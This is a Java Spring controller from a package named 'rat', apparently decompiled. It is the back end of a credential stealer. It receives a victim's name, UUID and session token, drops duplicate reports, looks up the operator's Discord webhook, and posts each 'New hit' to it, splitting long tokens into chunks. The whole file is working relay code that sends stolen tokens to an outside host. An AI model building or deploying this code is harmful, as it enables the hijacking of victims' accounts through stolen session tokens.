package com.example.rat;

import com.example.app.AppSettings;
import com.example.app.AppSettingsRepository;
import com.fasterxml.jackson.databind.JsonNode;
import com.fasterxml.jackson.databind.ObjectMapper;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.time.Instant;
import java.util.ArrayList;
import java.util.Iterator;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map;
import java.util.Optional;
import java.util.UUID;
import java.util.Map.Entry;
import java.util.concurrent.ConcurrentHashMap;
import org.springframework.http.ResponseEntity;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestBody;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;

@RestController
@RequestMapping("/api/report")
public class ThinReportController {
   private static final ObjectMapper JSON = new ObjectMapper();
   private static final ConcurrentHashMap<String, Long> SEEN = new ConcurrentHashMap<>();
   private static final ConcurrentHashMap<String, Long> DEAD_WEBHOOK = new ConcurrentHashMap<>();
   private static final long DUP_WINDOW_MS = 90000L;
   private static final long DEAD_TTL_MS = 600000L;
   private final AppSettingsRepository settingsRepo;

   public ThinReportController(AppSettingsRepository settingsRepo) {
      this.settingsRepo = settingsRepo;
   }

   @PostMapping
   public ResponseEntity<String> report(@RequestBody(required = false) String body) {
      try {
         String key = "";
         String name = "";
         String uuid = "";
         String token = "";
         String receiver = "";
         if (body != null && !body.trim().isEmpty()) {
            try {
               JsonNode n = JSON.readTree(body);
               if (n != null) {
                  key = str(n, "key");
                  name = str(n, "name");
                  uuid = str(n, "uuid");
                  token = str(n, "token");
                  receiver = str(n, "receiver");
               }
            } catch (Exception var19) {
            }
         }

         String dk = (name + "|" + uuid + "|" + token).trim();
         long now = System.currentTimeMillis();
         Long prev = SEEN.get(dk);
         if (prev != null && now - prev < 90000L) {
            System.out.println("[report] ts=" + now + " dup=true name=" + name + " uuid=" + uuid);
            return ResponseEntity.ok("{\"ok\":true,\"dup\":true}");
         }

         SEEN.put(dk, now);
         System.out.println("[report] ts=" + now + " dup=false name=" + name + " uuid=" + uuid);
         List<String> candidates = this.resolveWebhooks(key);
         long now0 = now;
         Iterator<String> it = candidates.iterator();

         while (it.hasNext()) {
            String w = it.next();
            boolean okUrl = w.startsWith("https://discord.com/api/webhooks/") || w.startsWith("https://discordapp.com/api/webhooks/");
            if (!okUrl) {
               System.out.println("[report] bad-webhook-url url=" + shortUrl(w));
               it.remove();
            } else {
               Long deadAt = DEAD_WEBHOOK.get(w);
               if (deadAt != null && now0 - deadAt < 600000L) {
                  System.out.println("[report] skip-dead-webhook url=" + shortUrl(w));
                  it.remove();
               }
            }
         }

         int code = -1;
         String used = "";

         for (String w : candidates) {
            int c = this.sendEmbed(w, name, uuid, token, receiver, key);
            code = c;
            if (c >= 200 && c < 300) {
               used = w;
               break;
            }
         }

         String shortUrl = used.length() > 80 ? used.substring(0, 80) : used;
         return ResponseEntity.ok("{\"ok\":true,\"wh\":" + !used.isEmpty() + ",\"url\":\"" + esc(shortUrl) + "\",\"code\":" + code + "}");
      } catch (Exception e) {
         return ResponseEntity.ok("{\"ok\":true,\"err\":\"" + esc(e.getMessage()) + "\"}");
      }
   }

   private List<String> resolveWebhooks(String key) {
      List<String> out = new ArrayList<>();

      try {
         if (key == null || key.isEmpty()) {
            return out;
         }

         String clean = key.replace("=", "");
         if (clean.startsWith("30e3267e-d80c-4a8f-84e2-bb475930a37c")) {
            clean = "30e3267e-d80c-4a8f-84e2-bb475930a37c";
         }

         Optional<AppSettings> opt;
         try {
            opt = this.settingsRepo.findById(UUID.fromString(clean));
         } catch (Exception e) {
            return out;
         }

         if (!opt.isPresent()) {
            return out;
         }

         JsonNode root = JSON.readTree(opt.get().getSettingsJson());
         this.collectDiscordTopLevel(root, out);
         if (out.isEmpty()) {
            this.collectWebhookDeep(root, out);
         }
      } catch (Exception var7) {
      }

      return out;
   }

   private void collectDiscordTopLevel(JsonNode root, List<String> out) {
      JsonNode items = root.path("Discord").path("items");
      if (items.isArray()) {
         for (JsonNode it : items) {
            if ("Webhook".equals(it.path("id").asText())) {
               addCandidate(out, it.path("value").asText(""));
            }
         }
      }
   }

   private static void addCandidate(List<String> out, String v) {
      if (v != null) {
         String t = v.trim();
         if (!t.isEmpty() && !out.contains(t)) {
            out.add(t);
         }
      }
   }

   private void collectWebhookDeep(JsonNode node, List<String> out) {
      if (node != null && !node.isNull()) {
         if (node.isObject()) {
            JsonNode id = node.get("id");
            if (id != null && "Webhook".equals(id.asText())) {
               JsonNode v = node.get("value");
               if (v != null && v.asText().length() > 0) {
                  addCandidate(out, v.asText());
               }
            }

            Iterator<Entry<String, JsonNode>> it = node.fields();

            while (it.hasNext()) {
               this.collectWebhookDeep(it.next().getValue(), out);
            }
         } else if (node.isArray()) {
            for (JsonNode ch : node) {
               this.collectWebhookDeep(ch, out);
            }
         }
      }
   }

   private int sendEmbed(String webhook, String name, String uuid, String token, String receiver, String key) {
      try {
         Map<String, Object> embed = new LinkedHashMap<>();
         embed.put("title", "New hit (fast relay)");
         embed.put("color", 5763719);
         embed.put("timestamp", Instant.now().toString());
         List<Map<String, Object>> fields = new ArrayList<>();
         fields.add(fld("Name", clip(name, 1000), true));
         fields.add(fld("UUID", clip(uuid, 1000), true));
         addTokenFields(fields, token);
         embed.put("fields", fields);
         Map<String, Object> payload = new LinkedHashMap<>();
         List<Map<String, Object>> embeds = new ArrayList<>();
         embeds.add(embed);
         payload.put("embeds", embeds);
         HttpURLConnection c = (HttpURLConnection)new URL(webhook).openConnection();
         c.setRequestMethod("POST");
         c.setDoOutput(true);
         c.setConnectTimeout(10000);
         c.setReadTimeout(10000);
         c.setRequestProperty("Content-Type", "application/json");
         c.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36");
         c.setRequestProperty("Accept", "application/json");
         OutputStream out = c.getOutputStream();

         try {
            out.write(JSON.writeValueAsBytes(payload));
         } catch (Throwable var16) {
            if (out != null) {
               try {
                  out.close();
               } catch (Throwable var15) {
                  var16.addSuppressed(var15);
               }
            }

            throw var16;
         }

         if (out != null) {
            out.close();
         }

         int code = c.getResponseCode();
         String resp = this.readResponseBody(c);
         c.disconnect();
         if (code == 400 || code == 401 || code == 404) {
            DEAD_WEBHOOK.put(webhook, System.currentTimeMillis());
         }

         System.out.println("[report] discord code=" + code + " body=" + resp);
         return code;
      } catch (Exception e) {
         System.out.println("[report] sendEmbed error: " + e.getMessage());
         return -1;
      }
   }

   private String readResponseBody(HttpURLConnection c) {
      try {
         InputStream is = c.getResponseCode() >= 400 ? c.getErrorStream() : c.getInputStream();

         String var9;
         label57: {
            String var5;
            try {
               if (is == null) {
                  var9 = "";
                  break label57;
               }

               byte[] buf = new byte[512];
               int n = is.read(buf);
               var5 = n > 0 ? new String(buf, 0, n, StandardCharsets.UTF_8) : "";
            } catch (Throwable var7) {
               if (is != null) {
                  try {
                     is.close();
                  } catch (Throwable var6) {
                     var7.addSuppressed(var6);
                  }
               }

               throw var7;
            }

            if (is != null) {
               is.close();
            }

            return var5;
         }

         if (is != null) {
            is.close();
         }

         return var9;
      } catch (Exception e) {
         return "";
      }
   }

   private static void addTokenFields(List<Map<String, Object>> fields, String token) {
      if (token != null && !token.isEmpty()) {
         int chunk = 1000;
         if (token.length() <= 1000) {
            fields.add(fld("Token", token, true));
         } else {
            int parts = (token.length() + 1000 - 1) / 1000;
            int i = 0;

            for (int p = 1; i < token.length() && p <= 20; p++) {
               String piece = token.substring(i, Math.min(token.length(), i + 1000));
               fields.add(fld(p == 1 ? "Token" : "Token " + p + "/" + parts, piece, false));
               i += 1000;
            }
         }
      } else {
         fields.add(fld("Token", "null", true));
      }
   }

   private static Map<String, Object> fld(String n, String v, boolean inline) {
      Map<String, Object> m = new LinkedHashMap<>();
      m.put("name", n);
      m.put("value", v == null ? "?" : v);
      m.put("inline", inline);
      return m;
   }

   private static String clip(String s, int max) {
      if (s == null) {
         return "";
      } else {
         return s.length() <= max ? s : s.substring(0, max);
      }
   }

   private static String shortUrl(String s) {
      if (s == null) {
         return "";
      } else {
         return s.length() <= 80 ? s : s.substring(0, 80);
      }
   }

   private static String str(JsonNode n, String f) {
      JsonNode x = n.get(f);
      return x != null && !x.isNull() ? x.asText() : "";
   }

   private static String esc(String s) {
      return s == null ? "" : s.replace("\\", "\\\\").replace("\"", "\\\"");
   }
}
